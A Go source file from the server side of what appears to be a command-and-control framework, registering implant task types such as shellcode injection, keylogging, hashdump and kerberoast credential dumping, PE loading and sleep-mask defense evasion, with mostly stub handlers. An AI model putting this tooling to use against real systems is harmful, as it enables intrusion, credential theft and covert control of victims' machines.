package server

import (
	"fmt"
	"log/slog"
)

type TaskHandler interface {
	Validate(task *task, agentID string) error
	OnBeforeDispatch(task *task, agentID string) error
	OnTaskComplete(task *task, result taskResult) error
	OnTaskFailed(task *task, result taskResult) error
}

type TaskHandlerEntry struct {
	Handler     TaskHandler
	Priority    int
	Description string
}

type TaskHandlerRegistry struct {
	handlers map[string]*TaskHandlerEntry
}

func NewTaskHandlerRegistry() *TaskHandlerRegistry {
	r := &TaskHandlerRegistry{
		handlers: make(map[string]*TaskHandlerEntry),
	}
	r.registerBuiltinHandlers()
	return r
}

func (r *TaskHandlerRegistry) Register(taskType string, handler TaskHandler, priority int, description string) {
	r.handlers[taskType] = &TaskHandlerEntry{
		Handler:     handler,
		Priority:    priority,
		Description: description,
	}
}

func (r *TaskHandlerRegistry) Get(taskType string) *TaskHandlerEntry {
	return r.handlers[taskType]
}

func (r *TaskHandlerRegistry) Has(taskType string) bool {
	_, ok := r.handlers[taskType]
	return ok
}

func (r *TaskHandlerRegistry) List() map[string]*TaskHandlerEntry {
	out := make(map[string]*TaskHandlerEntry, len(r.handlers))
	for k, v := range r.handlers {
		out[k] = v
	}
	return out
}

func (r *TaskHandlerRegistry) registerBuiltinHandlers() {
	r.Register("shell", &defaultTaskHandler{}, 0, "Shell command execution")
	r.Register("inject", &defaultTaskHandler{}, 0, "Shellcode injection")
	r.Register("screenshot", &defaultTaskHandler{}, 0, "Screenshot capture")
	r.Register("keylog_start", &defaultTaskHandler{}, 0, "Keylogger start")
	r.Register("keylog_stop", &defaultTaskHandler{}, 0, "Keylogger stop")
	r.Register("keylog_dump", &defaultTaskHandler{}, 0, "Keylogger dump")
	r.Register("download", &defaultTaskHandler{}, 0, "File download")
	r.Register("upload", &defaultTaskHandler{}, 0, "File upload")
	r.Register("ls", &defaultTaskHandler{}, 0, "Directory listing")
	r.Register("read", &defaultTaskHandler{}, 0, "File read")
	r.Register("cd", &defaultTaskHandler{}, 0, "Change directory")
	r.Register("pwd", &defaultTaskHandler{}, 0, "Print working directory")
	r.Register("ps", &defaultTaskHandler{}, 0, "Process list")
	r.Register("kill", &defaultTaskHandler{}, 0, "Kill process")
	r.Register("portscan", &defaultTaskHandler{}, 0, "Port scan")
	r.Register("hashdump", &credentialDumpHandler{}, 0, "Credential dump")
	r.Register("kerberoast", &credentialDumpHandler{}, 0, "Kerberoast")
	r.Register("execute_assembly", &injectionHandler{}, 0, "Execute .NET assembly")
	r.Register("bof", &injectionHandler{}, 0, "Execute BOF")
	r.Register("spawn", &injectionHandler{}, 0, "Spawn process")
	r.Register("shinject", &injectionHandler{}, 0, "Shellcode inject (shinject)")
	r.Register("shspawn", &injectionHandler{}, 0, "Shellcode spawn")
	r.Register("peloader", &injectionHandler{}, 0, "PE loader")
	r.Register("self_update", &updateHandler{}, 0, "Agent self-update")
	r.Register("set_sleep_mask", &defenseEvasionHandler{}, 0, "Set sleep mask")
	r.Register("set_sleep_mask_advanced", &defenseEvasionHandler{}, 0, "Set advanced sleep mask")
	r.Register("uninstall", &c2Handler{}, 0, "Agent uninstall")
	r.Register("set_sleep", &c2Handler{}, 0, "Set sleep interval")
	r.Register("set_working_hours", &c2Handler{}, 0, "Set working hours")
	r.Register("set_kill_date", &c2Handler{}, 0, "Set kill date")
	r.Register("sleep_mask_integrity_alert", &integrityAlertHandler{}, 3, "Sleep mask integrity failure alert")
}

type defaultTaskHandler struct{}

func (h *defaultTaskHandler) Validate(task *task, agentID string) error {
	if task.Type == "" {
		return fmt.Errorf("task type is required")
	}
	return nil
}

func (h *defaultTaskHandler) OnBeforeDispatch(task *task, agentID string) error { return nil }
func (h *defaultTaskHandler) OnTaskComplete(task *task, result taskResult) error { return nil }
func (h *defaultTaskHandler) OnTaskFailed(task *task, result taskResult) error { return nil }

type credentialDumpHandler struct{}

func (h *credentialDumpHandler) Validate(task *task, agentID string) error {
	if task.Type == "" {
		return fmt.Errorf("task type is required")
	}
	return nil
}

func (h *credentialDumpHandler) OnBeforeDispatch(task *task, agentID string) error { return nil }
func (h *credentialDumpHandler) OnTaskComplete(task *task, result taskResult) error { return nil }
func (h *credentialDumpHandler) OnTaskFailed(task *task, result taskResult) error  { return nil }

type injectionHandler struct{}

func (h *injectionHandler) Validate(task *task, agentID string) error {
	if task.Type == "" {
		return fmt.Errorf("task type is required")
	}
	return nil
}

func (h *injectionHandler) OnBeforeDispatch(task *task, agentID string) error { return nil }
func (h *injectionHandler) OnTaskComplete(task *task, result taskResult) error { return nil }
func (h *injectionHandler) OnTaskFailed(task *task, result taskResult) error  { return nil }

type updateHandler struct{}

func (h *updateHandler) Validate(task *task, agentID string) error {
	if task.Type == "" {
		return fmt.Errorf("task type is required")
	}
	return nil
}

func (h *updateHandler) OnBeforeDispatch(task *task, agentID string) error { return nil }
func (h *updateHandler) OnTaskComplete(task *task, result taskResult) error { return nil }
func (h *updateHandler) OnTaskFailed(task *task, result taskResult) error  { return nil }

type defenseEvasionHandler struct{}

func (h *defenseEvasionHandler) Validate(task *task, agentID string) error {
	if task.Type == "" {
		return fmt.Errorf("task type is required")
	}
	return nil
}

func (h *defenseEvasionHandler) OnBeforeDispatch(task *task, agentID string) error { return nil }
func (h *defenseEvasionHandler) OnTaskComplete(task *task, result taskResult) error { return nil }
func (h *defenseEvasionHandler) OnTaskFailed(task *task, result taskResult) error  { return nil }

type c2Handler struct{}

func (h *c2Handler) Validate(task *task, agentID string) error {
	if task.Type == "" {
		return fmt.Errorf("task type is required")
	}
	return nil
}

func (h *c2Handler) OnBeforeDispatch(task *task, agentID string) error { return nil }
func (h *c2Handler) OnTaskComplete(task *task, result taskResult) error { return nil }
func (h *c2Handler) OnTaskFailed(task *task, result taskResult) error  { return nil }

type integrityAlertHandler struct{}

func (h *integrityAlertHandler) Validate(task *task, agentID string) error {
	return nil
}

func (h *integrityAlertHandler) OnBeforeDispatch(task *task, agentID string) error {
	return nil
}

func (h *integrityAlertHandler) OnTaskComplete(task *task, result taskResult) error {
	slog.Error("Sleep mask integrity failure",
		"task_id", task.ID,
		"output", result.Output,
		"error", result.Error,
	)
	return nil
}

func (h *integrityAlertHandler) OnTaskFailed(task *task, result taskResult) error {
	slog.Error("Sleep mask integrity failure",
		"task_id", task.ID,
		"output", result.Output,
		"error", result.Error,
	)
	return nil
}
